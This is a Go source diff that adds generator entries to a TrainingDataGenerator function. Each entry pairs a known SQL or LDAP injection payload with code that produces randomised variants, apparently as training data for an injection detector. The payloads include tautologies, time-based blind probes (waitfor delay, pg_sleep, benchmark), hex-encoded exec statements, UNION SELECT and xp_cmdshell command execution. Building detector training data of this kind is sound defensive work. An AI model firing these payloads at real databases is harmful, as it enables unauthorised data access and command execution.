@@ -1792,6 +1792,1444 @@ func TrainingDataGenerator(rnd *rand.Rand) []Generator {
 				return
 			},
 		},
+		{
+			Form: "bfilename",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "bfilename"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: " having 1=1--",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "having"
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: ") or benchmark(10000000,MD5(1))#",
+			Make: func() (sample string) {
+				sample += ")"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleBenchmark()
+				sample += "#"
+				return
+			},
+		},
+		{
+			Form: " or username like char(37);",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "like"
+				sample += sampleSpaces()
+				sample += "char("
+				sample += sampleNumber(256)
+				sample += ");"
+				return
+			},
+		},
+		{
+			Form: ";waitfor delay '0:0:__TIME__'--",
+			Make: func() (sample string) {
+				sample += ";waitfor"
+				sample += sampleSpaces()
+				sample += "delay"
+				sample += sampleSpaces()
+				sample += "'"
+				sample += sampleNumber(24)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += "'--"
+				return
+			},
+		},
+		{
+			Form: "\" or 1=1--",
+			Make: func() (sample string) {
+				sample += "\""
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "x' AND userid IS NULL; --",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleAnd()
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "is"
+				sample += sampleSpaces()
+				sample += "null;"
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "*/*",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "*"
+				sample += sampleSpaces()
+				sample += "/*"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: " or 'text' > 't'",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				short := sampleName()
+				long := short + sampleName()
+				sample += long
+				sample += "'"
+				sample += sampleSpaces()
+				sample += ">"
+				sample += sampleSpaces()
+				sample += "'"
+				sample += short
+				sample += "'"
+				return
+			},
+		},
+		{
+			Form: " (select top 1",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "(select"
+				sample += sampleSpaces()
+				sample += "top"
+				sample += sampleSpaces()
+				sample += sampleNumber(1337)
+				return
+			},
+		},
+		{
+			Form: " or benchmark(10000000,MD5(1))#",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleBenchmark()
+				sample += "#"
+				return
+			},
+		},
+		{
+			Form: "\");waitfor delay '0:0:__TIME__'--",
+			Make: func() (sample string) {
+				sample += "\");waitfor"
+				sample += sampleSpaces()
+				sample += "delay"
+				sample += sampleSpaces()
+				sample += "'"
+				sample += sampleNumber(24)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += "'--"
+				return
+			},
+		},
+		{
+			Form: "a' or 3=3--",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: " -- &password=",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "--"
+				sample += sampleSpaces()
+				sample += "&"
+				sample += sampleName()
+				sample += "="
+				return
+			},
+		},
+		{
+			Form: " group by userid having 1=1--",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "group"
+				sample += sampleSpaces()
+				sample += "by"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "having"
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: " or ''='",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "''='"
+				return
+			},
+		},
+		{
+			Form: "; exec master..xp_cmdshell",
+			Make: func() (sample string) {
+				sample += ";"
+				sample += sampleSpaces()
+				sample += "exec"
+				sample += sampleSpaces()
+				sample += "master..xp_cmdshell"
+				return
+			},
+		},
+		{
+			Form: "%20or%20x=x",
+			Make: func() (sample string) {
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				name := sampleName()
+				sample += name
+				sample += "="
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "select",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "\")) or sleep(__TIME__)=\"",
+			Make: func() (sample string) {
+				sample += "\"))"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "sleep("
+				sample += sampleNumber(1337)
+				sample += ")=\""
+				return
+			},
+		},
+		{
+			Form: "0x730065006c0065006300740020004000400076006500 ...",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "hi' or 1=1 --",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "\") or pg_sleep(__TIME__)--",
+			Make: func() (sample string) {
+				sample += "\")"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "pg_sleep("
+				sample += sampleNumber(1337)
+				sample += ")--"
+				return
+			},
+		},
+		{
+			Form: "%20or%20'x'='x",
+			Make: func() (sample string) {
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				sample += "'"
+				name := sampleName()
+				sample += name
+				sample += "'='"
+				sample += name
+				return
+			},
+		},
+		{
+			Form: " or 'something' = 'some'+'thing'",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				name := sampleName()
+				sample += name
+				sample += "'"
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += "'"
+				for _, v := range name {
+					sample += string(v)
+					if rnd.Intn(3) == 0 {
+						sample += "'+'"
+					}
+				}
+				sample += "'"
+				return
+			},
+		},
+		{
+			Form: "exec sp",
+			Make: func() (sample string) {
+				sample += "exec"
+				sample += sampleSpaces()
+				sample += "sp"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "29 %",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += "%"
+				return
+			},
+		},
+		{
+			Form: "(",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "Ã½ or 1=1 --",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "1 or pg_sleep(__TIME__)--",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "pg_sleep("
+				sample += sampleNumber(1337)
+				sample += ")--"
+				return
+			},
+		},
+		{
+			Form: "0 or 1=1",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				return
+			},
+		},
+		{
+			Form: ") or (a=a",
+			Make: func() (sample string) {
+				sample += ")"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "("
+				name := sampleName()
+				sample += name
+				sample += "="
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "uni/**/on sel/**/ect",
+			Make: func() (sample string) {
+				form := "union"
+				form += sampleSpaces()
+				form += "select"
+				for _, v := range form {
+					sample += string(v)
+					if rnd.Intn(3) == 0 {
+						sample += "/**/"
+					}
+				}
+				return
+			},
+		},
+		{
+			Form: "replace",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "replace"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "%27%20or%201=1",
+			Make: func() (sample string) {
+				sample += "%27"
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				return
+			},
+		},
+		{
+			Form: ")) or pg_sleep(__TIME__)--",
+			Make: func() (sample string) {
+				sample += "))"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "pg_sleep("
+				sample += sampleNumber(1337)
+				sample += ")--"
+				return
+			},
+		},
+		{
+			Form: "%7C",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "%7C"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleAnd()
+				sample += sampleSpaces()
+				sample += "1=(select"
+				sample += sampleSpaces()
+				sample += "count(*)"
+				sample += sampleSpaces()
+				sample += "from"
+				sample += sampleSpaces()
+				sample += "tabname);"
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "&apos;%20OR",
+			Make: func() (sample string) {
+				sample += "&apos;"
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "; or '1'='1'",
+			Make: func() (sample string) {
+				sample += ";"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				number := sampleNumber(1337)
+				sample += number
+				sample += "'='"
+				sample += number
+				sample += "'"
+				return
+			},
+		},
+		{
+			Form: "declare @q nvarchar (200) select @q = 0x770061 ...",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "nvarchar"
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleNumber(200)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "@"
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				return
+			},
+		},
+		{
+			Form: "1 or 1=1",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				return
+			},
+		},
+		{
+			Form: "; exec ('sel' + 'ect us' + 'er')",
+			Make: func() (sample string) {
+				sample += ";"
+				sample += sampleSpaces()
+				sample += "exec"
+				sample += sampleSpaces()
+				sample += "(''"
+				form := "select " + sampleName()
+				for _, v := range form {
+					sample += string(v)
+					if rnd.Intn(3) == 0 {
+						sample += "' + '"
+					}
+				}
+				sample += "')"
+				return
+			},
+		},
+		{
+			Form: "23 OR 1=1",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				return
+			},
+		},
+		{
+			Form: "/",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "/"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "anything' OR 'x'='x",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				name := sampleName()
+				sample += name
+				sample += "'='"
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "declare @q nvarchar (4000) select @q =",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "nvarchar"
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleNumber(4000)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "@"
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				return
+			},
+		},
+		{
+			Form: "or 0=0 --",
+			Make: func() (sample string) {
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "desc",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "desc"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "||'6",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "||'6"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: ")",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += ")"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "1)) or sleep(__TIME__)#",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += "))"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "sleep("
+				sample += sampleNumber(1337)
+				sample += ")#"
+				return
+			},
+		},
+		{
+			Form: "or 0=0 #",
+			Make: func() (sample string) {
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "#"
+				return
+			},
+		},
+		{
+			Form: " select name from syscolumns where id = (sele ...",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "from"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "where"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += "(select "
+				sample += sampleNumber(1337)
+				sample += ")"
+				return
+			},
+		},
+		{
+			Form: "hi or a=a",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				name := sampleName()
+				sample += name
+				sample += "="
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "*(|(mail=*))",
+			Make: func() (sample string) {
+				sample += "*(|("
+				sample += sampleName()
+				sample += "=*))"
+				return
+			},
+		},
+		{
+			Form: "password:*/=1--",
+			Make: func() (sample string) {
+				sample += "password:*/="
+				sample += sampleNumber(1337)
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "distinct",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "distinct"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: ");waitfor delay '0:0:__TIME__'--",
+			Make: func() (sample string) {
+				sample += ");waitfor"
+				sample += sampleSpaces()
+				sample += "delay"
+				sample += sampleSpaces()
+				sample += "'"
+				sample += sampleNumber(24)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += ":"
+				sample += sampleNumber(60)
+				sample += "'--"
+				return
+			},
+		},
+		{
+			Form: "to_timestamp_tz",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "to_timestamp_tz"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "\") or benchmark(10000000,MD5(1))#",
+			Make: func() (sample string) {
+				sample += "\")"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleBenchmark()
+				sample += "#"
+				return
+			},
+		},
+		{
+			Form: " UNION SELECT",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "union"
+				sample += sampleSpaces()
+				sample += "select"
+				return
+			},
+		},
+		{
+			Form: "%2A%28%7C%28mail%3D%2A%29%29",
+			Make: func() (sample string) {
+				sample += sampleHexSpaces()
+				sample += "%2A%28%7C%28"
+				sample += sampleName()
+				sample += "%3D%2A%29%29"
+				sample += sampleHexSpaces()
+				return
+			},
+		},
+		{
+			Form: "+sqlvuln",
+			Make: func() (sample string) {
+				sample += "+"
+				sample += sampleName()
+				return
+			},
+		},
+		{
+			Form: " or 1=1 /*",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "/*"
+				return
+			},
+		},
+		{
+			Form: ")) or sleep(__TIME__)='",
+			Make: func() (sample string) {
+				sample += "))"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "sleep("
+				sample += sampleNumber(1337)
+				sample += ")='"
+				return
+			},
+		},
+		{
+			Form: "or 1=1 or \"\"=",
+			Make: func() (sample string) {
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "\"\"="
+				return
+			},
+		},
+		{
+			Form: " or 1 in (select @@version)--",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += "in"
+				sample += sampleSpaces()
+				sample += "(select"
+				sample += sampleSpaces()
+				sample += "@@"
+				sample += sampleName()
+				sample += ")--"
+				return
+			},
+		},
+		{
+			Form: "sqlvuln;",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += ";"
+				return
+			},
+		},
+		{
+			Form: " union select * from users where login = char ...",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "union"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "*"
+				sample += sampleSpaces()
+				sample += "from"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "where"
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += "char"
+				sample += sampleSpaces()
+				for i := 0; i < 7; i++ {
+					sample += sampleNumber(256)
+					sample += ","
+				}
+				sample += sampleNumber(256)
+				return
+			},
+		},
+		{
+			Form: "x' or 1=1 or 'x'='y",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				sample += sampleName()
+				sample += "'='"
+				sample += sampleName()
+				return
+			},
+		},
+		{
+			Form: "28 %",
+			Make: func() (sample string) {
+				sample += sampleNumber(1337)
+				sample += sampleSpaces()
+				sample += "%"
+				return
+			},
+		},
+		{
+			Form: "â or 3=3 --",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "@variable",
+			Make: func() (sample string) {
+				sample += "@"
+				sample += sampleName()
+				return
+			},
+		},
+		{
+			Form: " or '1'='1'--",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "'"
+				number := sampleNumber(1337)
+				sample += number
+				sample += "'='"
+				sample += number
+				sample += "'--"
+				return
+			},
+		},
+		{
+			Form: "\"a\"\" or 1=1--\"",
+			Make: func() (sample string) {
+				sample += "\""
+				sample += sampleName()
+				sample += "\"\""
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--\""
+				return
+			},
+		},
+		{
+			Form: "//*",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "//*"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "%2A%7C",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "%2A%7C"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "\" or 0=0 --",
+			Make: func() (sample string) {
+				sample += "\""
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "\")) or pg_sleep(__TIME__)--",
+			Make: func() (sample string) {
+				sample += "\"))"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += "pg_sleep("
+				sample += sampleNumber(1337)
+				sample += ")--"
+				return
+			},
+		},
+		{
+			Form: "?",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "?"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: " or 1/*",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleNumber(1337)
+				sample += "/*"
+				return
+			},
+		},
+		{
+			Form: "!",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += "!"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "'",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: " or a = a",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "nvarchar"
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleNumber(200)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "@"
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				sample += sampleSpaces()
+				sample += "exec(@"
+				sample += name
+				sample += ")"
+				return
+			},
+		},
+		{
+			Form: "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "varchar("
+				sample += sampleNumber(200)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "@"
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				sample += sampleSpaces()
+				sample += "exec(@"
+				sample += name
+				sample += ")"
+				sample += sampleSpaces()
+				return
+			},
+		},
+		{
+			Form: "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "nvarchar"
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleNumber(200)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				sample += sampleSpaces()
+				sample += "exec(@"
+				sample += name
+				sample += ")"
+				return
+			},
+		},
+		{
+			Form: "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)",
+			Make: func() (sample string) {
+				sample += "declare"
+				sample += sampleSpaces()
+				sample += "@"
+				name := sampleName()
+				sample += name
+				sample += sampleSpaces()
+				sample += "varchar"
+				sample += sampleSpaces()
+				sample += "("
+				sample += sampleNumber(200)
+				sample += ")"
+				sample += sampleSpaces()
+				sample += "select"
+				sample += sampleSpaces()
+				sample += "@"
+				sample += name
+				sample += sampleSpaces()
+				sample += "="
+				sample += sampleSpaces()
+				sample += sampleHex(1337 * 1337)
+				sample += sampleSpaces()
+				sample += "exec(@"
+				sample += name
+				sample += ")"
+				return
+			},
+		},
+		{
+			Form: "' or 1=1",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				return
+			},
+		},
+		{
+			Form: " or 1=1 --",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "x' OR full_name LIKE '%Bob%",
+			Make: func() (sample string) {
+				sample += sampleName()
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				sample += sampleName()
+				sample += sampleSpaces()
+				sample += "like"
+				sample += sampleSpaces()
+				sample += "'%"
+				sample += sampleName()
+				sample += "%"
+				return
+			},
+		},
+		{
+			Form: "'; exec master..xp_cmdshell 'ping 172.10.1.255'--",
+			Make: func() (sample string) {
+				sample += "';"
+				sample += sampleSpaces()
+				sample += "exec"
+				sample += sampleSpaces()
+				sample += "master..xp_cmdshell"
+				sample += sampleSpaces()
+				sample += "'ping"
+				sample += sampleSpaces()
+				sample += sampleNumber(256)
+				sample += "."
+				sample += sampleNumber(256)
+				sample += "."
+				sample += sampleNumber(256)
+				sample += "."
+				sample += sampleNumber(256)
+				sample += "'--"
+				return
+			},
+		},
+		{
+			Form: "'%20or%20''='",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				sample += "''='"
+				return
+			},
+		},
+		{
+			Form: "'%20or%20'x'='x",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				sample += "'"
+				name := sampleName()
+				sample += name
+				sample += "'='"
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "')%20or%20('x'='x",
+			Make: func() (sample string) {
+				sample += "')"
+				sample += sampleHexSpaces()
+				sample += sampleOr()
+				sample += sampleHexSpaces()
+				sample += "('"
+				name := sampleName()
+				sample += name
+				sample += "'='"
+				sample += name
+				return
+			},
+		},
+		{
+			Form: "' or 0=0 --",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "--"
+				return
+			},
+		},
+		{
+			Form: "' or 0=0 #",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "#"
+				return
+			},
+		},
+		{
+			Form: " or 0=0 #\"",
+			Make: func() (sample string) {
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += sampleSpaces()
+				sample += "#\""
+				return
+			},
+		},
+		{
+			Form: "' or 1=1--",
+			Make: func() (sample string) {
+				sample += "'"
+				sample += sampleSpaces()
+				sample += sampleOr()
+				sample += sampleSpaces()
+				number := sampleNumber(1337)
+				sample += number
+				sample += "="
+				sample += number
+				sample += "--"
+				return
+			},
+		},
 	}
 	return generators
 }
